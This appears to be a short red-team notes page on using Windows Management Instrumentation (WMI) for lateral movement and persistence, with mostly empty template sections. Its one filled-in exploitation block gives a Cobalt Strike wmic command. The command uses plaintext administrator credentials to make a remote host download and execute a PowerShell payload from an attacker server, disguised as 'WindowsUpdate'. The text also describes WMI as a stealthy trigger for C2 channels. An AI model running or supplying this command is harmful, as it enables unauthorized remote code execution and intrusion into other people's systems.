### Technical Overview
Windows Management Instrumentation (WMI) is Microsoft's implementation of the Web-Based Enterprise Management Model and can be used for a wide variety of tasks.

Since WMI has remoting capabilities, it can also be used for lateral movement. WMI used to be very hard to detect, but since sysmon introduced several event ID's that log WMI actions it is not as stealth as it once was.
###### OPSEC
WMI is loved by adversaries since it can be used as a trigger based mechanism to execute arbitrary code and is therefore an ideal persistence mechanism. 
- For example, trigger a C2 channel when the computer has been turned on for at least 1 hour

# C2 - Cobalt Strike

## Overview 

```markdown
```
## Enumeration 

```markdown
```

## Exploitation 

```powershell
shell wmic /NODE:fs01 /user:"FS01\Administrator" /password: "sup3rs3cr3tP@ssw0rd!!" process call create "powershell IEX ((new-object net.webclient).downloadstring('http://10.130.4.100:8888/WindowsUpdate'))"
```

---
# Windows
## Overview 

```markdown
```
## Enumeration 

```markdown
```

## Exploitation 

```markdown
```

----
# Linux
## Overview 

```markdown
```
## Enumeration 

```markdown
```

## Exploitation 

```markdown
```
